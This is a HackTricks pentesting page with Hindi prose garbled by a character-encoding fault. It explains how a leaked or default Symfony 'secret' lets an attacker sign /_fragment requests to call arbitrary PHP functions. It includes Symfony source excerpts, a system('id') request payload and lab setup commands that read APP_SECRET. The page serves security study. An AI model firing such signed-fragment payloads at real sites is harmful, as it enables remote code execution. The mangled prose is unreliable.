# Symfony

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рддрд░рдХреАрдмреЗрдВ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдЬрдорд╛ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ.

</details>

## рдкрд░рд┐рдЪрдп <a href="#introduction" id="introduction"></a>

2008 рдореЗрдВ рдЗрд╕рдХреА рд╕реГрд╖реНрдЯрд┐ рдХреЗ рдмрд╛рдж рд╕реЗ, [Symfony](https://symfony.com) рдлреНрд░реЗрдорд╡рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ PHP рдЖрдзрд╛рд░рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдореЗрдВ рдмрдврд╝рддрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдпрд╣ рдЕрдм рдХрдИ рдкреНрд░рд╕рд┐рджреНрдз CMSs рдХрд╛ рдореБрдЦреНрдп рдШрдЯрдХ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ [Drupal](https://www.drupal.org), [Joomla!](https://www.joomla.org), [eZPlatform](https://ezplatform.com) (рдкреВрд░реНрд╡ рдореЗрдВ eZPublish), рдпрд╛ [Bolt](https://bolt.cm), рдФрд░ рдЕрдХреНрд╕рд░ рдХрд╕реНрдЯрдо рд╡реЗрдмрд╕рд╛рдЗрдЯреНрд╕ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

Symfony рдХреА рдПрдХ рдирд┐рд░реНрдорд┐рдд рд╕реБрд╡рд┐рдзрд╛, [ESI (Edge-Side Includes)](https://en.wikipedia.org/wiki/Edge\_Side\_Includes) рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдИ рдЧрдИ, [`FragmentListener` рдХреНрд▓рд╛рд╕](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php) рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ, рдЬрдм рдХреЛрдИ `/_fragment` рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╢реНрд░реЛрддрд╛ рджрд┐рдП рдЧрдП GET рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рд╕реЗ рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рдпрд╣ **рдордирдорд╛рдиреЗ PHP рдХреЛрдб рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ** (_рдЗрд╕ рдкрд░ рдмрд╛рдж рдореЗрдВ рдФрд░_), рдЕрдиреБрд░реЛрдз рдХреЛ HMAC рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ HMAC рдХреА рдЧреБрдкреНрдд рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлрд┐рдХ рдХреБрдВрдЬреА `secret` рдирд╛рдордХ Symfony рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд╛рди рдХреЗ рддрд╣рдд рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИред

рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд╛рди, `secret`, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, CSRF рдЯреЛрдХрди рдФрд░ рд░рд┐рдореЗрдореНрдмрд░-рдореА рдЯреЛрдХрди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдорд╣рддреНрд╡ рдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП, рдЗрд╕ рдорд╛рди рдХреЛ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдмрд╣реБрдд рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢, рд╣рдордиреЗ рдкрд╛рдпрд╛ рд╣реИ рдХрд┐ рдЕрдХреНрд╕рд░, `secret` рдпрд╛ рддреЛ рдПрдХ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди** рд╣реЛрддрд╛ рд╣реИ, рдпрд╛ рдЗрд╕ рдорд╛рди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ, рдСрдлрд╝рд▓рд╛рдЗрди рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ, рдпрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪ рдХреЛ рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рдпрд╣ рдЬреБрдбрд╝рд╛ рд╣реБрдЖ рд╣реИ, рдЙрд╕реЗ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ **рддрд░реАрдХреЗ рдореМрдЬреВрдж рд╣реИрдВ**ред рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ Bolt, eZPlatform, рдФрд░ eZPublish рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореБрджреНрджрд╛ рдкреНрд░рддреАрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд╣рдордиреЗ рдкрд╛рдпрд╛ рд╣реИ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ, рдмреНрд░реВрдЯрдлреЛрд░реНрд╕реЗрдмрд▓ рдпрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдорд╛рди рдЙрд▓реНрд▓рд┐рдЦрд┐рдд CMSs рдореЗрдВ рдФрд░ рдХрд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдореЗрдВ **рдмрд╣реБрдд, рдмрд╣реБрдд рдЕрдХреНрд╕рд░ рдореМрдЬреВрдж рд╣реЛрддреЗ рд╣реИрдВ**ред рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдпрд╛ рд╕реНрдерд╛рдкрдирд╛ рдЧрд╛рдЗрдб рдореЗрдВ рдЗрд╕рдХреЗ рдорд╣рддреНрд╡ рдкрд░ рдкрд░реНрдпрд╛рдкреНрдд рдЬреЛрд░ рди рджреЗрдиреЗ рдХреЗ рдХрд╛рд░рдг рд╣реЛрддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрдо-рдкреНрд░рднрд╛рд╡ рд╡рд╛рд▓реА рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ `secret` рдХреЛ рдкрдврд╝ рд╕рдХреЗ (рдПрдХ рдлрд╛рдЗрд▓ рдкреНрд░рдХрдЯреАрдХрд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ), `/_fragment` рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХреЗ (рдПрдХ SSRF рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ), рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ `phpinfo()` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕реЗ рд▓реАрдХ рднреА рдХрд░ рд╕рдХрддрд╛ рд╣реИ!

рдЗрд╕ рдмреНрд▓реЙрдЧрдкреЛрд╕реНрдЯ рдореЗрдВ, рд╣рдо рд╡рд░реНрдгрди рдХрд░реЗрдВрдЧреЗ рдХрд┐ рдХреИрд╕реЗ рд╡рд┐рднрд┐рдиреНрди CMSs рдФрд░ рдореВрд▓ рдлреНрд░реЗрдорд╡рд░реНрдХ рдкрд░ `secret` рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдХреИрд╕реЗ рдЙрд╕ рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## рдЗрддрд┐рд╣рд╛рд╕ рдореЗрдВ рдереЛрдбрд╝рд╛ рд╕рд╛ <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

рдПрдХ рдЖрдзреБрдирд┐рдХ рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реЛрдиреЗ рдХреЗ рдирд╛рддреЗ, Symfony рдХреЛ рдЕрдкрдиреА рд╕реГрд╖реНрдЯрд┐ рд╕реЗ рд▓реЗрдХрд░ рдЖрдЬ рддрдХ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЗ рдЙрдк-рднрд╛рдЧреЛрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде рдирд┐рдкрдЯрдирд╛ рдкрдбрд╝рд╛ рд╣реИред `/_fragment` рд╕реЗ рдкрд╣рд▓реЗ, `/_internal` рдФрд░ `/_proxy` рдереЗ, рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдореВрд▓ рд░реВрдк рд╕реЗ рд╡рд╣реА рдХрд╛рдо рдХрд┐рдпрд╛ред рдЗрд╕рдиреЗ рд╡рд░реНрд╖реЛрдВ рдореЗрдВ рдХрдИ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдЙрддреНрдкрд╛рджрди рдХрд┐рдпрд╛: [CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes), [CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy), рдФрд░ [CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access), рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдПред

Symfony 4 рдХреЗ рдмрд╛рдж рд╕реЗ, `secret` рд╕реНрдерд╛рдкрдирд╛ рдкрд░ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ `/_fragment` рдкреГрд╖реНрда рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдХреЛрдИ рд╕реЛрдЪ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдХрдордЬреЛрд░ `secret` рд╣реЛрдиреЗ рдХреЗ рд╕рд╛рде-рд╕рд╛рде `/_fragment` рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рджреБрд░реНрд▓рдн рд╣реЛрдЧрд╛ред рдпрд╣ рдирд╣реАрдВ рд╣реИ: рдХрдИ рдлреНрд░реЗрдорд╡рд░реНрдХ рдкреБрд░рд╛рдиреЗ Symfony рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВ (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ 2.x рдЕрднреА рднреА рдмрд╣реБрдд рдореМрдЬреВрдж рд╣реИ), рдФрд░ рдпрд╛ рддреЛ рдПрдХ рд╕реНрдерд┐рд░ `secret` рдорд╛рди рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ, рдпрд╛ рдЗрд╕реЗ рдЦрд░рд╛рдм рддрд░реАрдХреЗ рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХрдИ ESI рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕ рддрд░рд╣ `/_fragment` рдкреГрд╖реНрда рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЬреИрд╕рд╛ рдХрд┐ рд╣рдо рджреЗрдЦреЗрдВрдЧреЗ, рдЕрдиреНрдп рдХрдо-рдкреНрд░рднрд╛рд╡ рд╡рд╛рд▓реА рдХрдордЬреЛрд░рд┐рдпрд╛рдВ `secret` рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИрдВ, рднрд▓реЗ рд╣реА рдЗрд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред

## `secret` рдХреА рдорджрдж рд╕реЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рд╣рдо рджрд┐рдЦрд╛рдПрдВрдЧреЗ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░, `secret` рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд╛рди рдХрд╛ рдЬреНрдЮрд╛рди рд╣реЛрдиреЗ рдкрд░, рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЕрдВрддрд┐рдо `symfony/http-kernel` рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЕрдиреНрдп рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдЗрд╕реА рддрд░рд╣ рд╣реИред

### `/_fragment` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдЪрд▓рд╛рдирд╛ <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╣рдо `/_fragment` рдкреГрд╖реНрда рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
public function onKernelRequest(RequestEvent $event)
{
$request = $event->getRequest();

# [1]
if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
return;
}

if ($request->attributes->has('_controller')) {
// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
$request->query->remove('_path');

return;
}

# [2]
if ($event->isMasterRequest()) {
$this->validateRequest($request);
}

# [3]
parse_str($request->query->get('_path', ''), $attributes);
$request->attributes->add($attributes);
$request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
$request->query->remove('_path');
}
}
```
`FragmentListener:onKernelRequest` рд╣рд░ рдЕрдиреБрд░реЛрдз рдкрд░ рдЪрд▓реЗрдЧрд╛: рдпрджрд┐ рдЕрдиреБрд░реЛрдз рдХрд╛ рдкрде `/_fragment` рд╣реИ \[1], рддреЛ рдпрд╣ рд╡рд┐рдзрд┐ рдкрд╣рд▓реЗ рдпрд╣ рдЬрд╛рдВрдЪреЗрдЧреА рдХрд┐ рдЕрдиреБрд░реЛрдз рдорд╛рдиреНрдп рд╣реИ (_рдЕрд░реНрдерд╛рддреН_ рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реИ), рдФрд░ рдЕрдиреНрдпрдерд╛ рдПрдХ рдЕрдкрд╡рд╛рдж рдЙрдард╛рдПрдЧреА \[2]. рдпрджрд┐ рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪ рд╕рдлрд▓ рд╣реЛрддреА рд╣реИ, рддреЛ рдпрд╣ url-encoded `_path` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░реЗрдЧреА, рдФрд░ `$request` рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рддрджрдиреБрд╕рд╛рд░ рд╕реЗрдЯ рдХрд░реЗрдЧреАред

рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ HTTP рдЕрдиреБрд░реЛрдз рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЗ рд╕рд╛рде рднреНрд░рдорд┐рдд рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП: рдпреЗ рдЖрдВрддрд░рд┐рдХ рдореВрд▓реНрдп рд╣реИрдВ, рдЬрд┐рдиреНрд╣реЗрдВ Symfony рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдорддреМрд░ рдкрд░ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрди рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдореЗрдВ рд╕реЗ рдПрдХ `_controller` рд╣реИ, рдЬреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕рд╛ Symfony рдХрдВрдЯреНрд░реЛрд▓рд░ (рдПрдХ _(class, method)_ рдпреБрдЧреНрдо, рдпрд╛ рд╕рд┐рд░реНрдл рдПрдХ _function_) рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реИред рдЬрд┐рди рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХрд╛ рдирд╛рдо `_` рд╕реЗ рд╢реБрд░реВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ рд╡реЗ рддрд░реНрдХ рд╣реИрдВ рдЬреЛ рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рдЦрд┐рд▓рд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рд╣рдо рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рдереЗ:
```php
class SomeClass
{
public function someMethod($firstMethodParam, $secondMethodParam)
{
...
}
}
```
рд╣рдордиреЗ `_path` рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗрдЯ рдХрд┐рдпрд╛:

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

рддрдм рдЕрдиреБрд░реЛрдз рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджрд┐рдЦреЗрдЧрд╛:

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

рдореВрд▓ рд░реВрдк рд╕реЗ, рдпрд╣ рдХрд┐рд╕реА рднреА рдлрдВрдХреНрд╢рди рдпрд╛ рдХрд┐рд╕реА рднреА рдХреНрд▓рд╛рд╕ рдХреЗ рдХрд┐рд╕реА рднреА рдореЗрдердб рдХреЛ рдХрд┐рд╕реА рднреА рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред Symfony рдХреЗ рдкрд╛рд╕ рдЬреЛ рдЕрдиреЗрдХ рдХреНрд▓рд╛рд╕реЗрд╕ рд╣реИрдВ, рдЙрдирдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП, **рдХреЛрдб рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рд░рд▓ рд╣реИ**ред рд╣рдо, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `system()` рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_рд╣рд░ рдмрд╛рд░ system рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛: рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП Exploit рдЕрдиреБрднрд╛рдЧ рдХрд╛ рд╕рдВрджрд░реНрдн рд▓реЗрдВред_

рдПрдХ рд╕рдорд╕реНрдпрд╛ рдмрд╛рдХреА рд╣реИ: Symfony рдЕрдиреБрд░реЛрдз рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рдХреИрд╕реЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ?

### URL рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдирд╛ <a href="#signing-the-url" id="signing-the-url"></a>

URL рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, _рдкреВрд░реЗ_ URL рдХреЗ рдЦрд┐рд▓рд╛рдл рдПрдХ HMAC рдХреА рдЧрдгрдирд╛ рдХреА рдЬрд╛рддреА рд╣реИред рдкреНрд░рд╛рдкреНрдд рд╣реИрд╢ рдХреА рддреБрд▓рдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реИрд╢ рд╕реЗ рдХреА рдЬрд╛рддреА рд╣реИред

рдХреЛрдб рдХреЗ рд╣рд┐рд╕рд╛рдм рд╕реЗ, рдпрд╣ рджреЛ рдЬрдЧрд╣реЛрдВ рдкрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// is the Request signed?
if ($this->signer->checkRequest($request)) {
return;
}

# [3]
throw new AccessDeniedHttpException();
}
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
public function checkRequest(Request $request): bool
{
$qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
}

/**
* Checks that a URI contains the correct hash.
*
* @return bool True if the URI is signed correctly, false otherwise
*/
public function check(string $uri)
{
$url = parse_url($uri);
if (isset($url['query'])) {
parse_str($url['query'], $params);
} else {
$params = [];
}

if (empty($params[$this->parameter])) {
return false;
}

$hash = $params[$this->parameter];
unset($params[$this->parameter]);

# [2]
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
}

private function computeHash(string $uri): string
{
# [1]
return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
}

private function buildUrl(array $url, array $params = []): string
{
ksort($params, SORT_STRING);
$url['query'] = http_build_query($params, '', '&');

$scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
$host = isset($url['host']) ? $url['host'] : '';
$port = isset($url['port']) ? ':'.$url['port'] : '';
$user = isset($url['user']) ? $url['user'] : '';
$pass = isset($url['pass']) ? ':'.$url['pass'] : '';
$pass = ($user || $pass) ? "$pass@" : '';
$path = isset($url['path']) ? $url['path'] : '';
$query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
$fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
}
}
```
### рдЙрджрд╛рд╣рд░рдг <a href="#example" id="example"></a>

рдЗрд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдЗрдП рдПрдХ рдкрд░реАрдХреНрд╖рдг рд╡рд╛рддрд╛рд╡рд░рдг рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ, рдФрд░ рдЧреБрдкреНрдд рдХреЛрдб рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВ (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЧрдпрд╛)ред
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
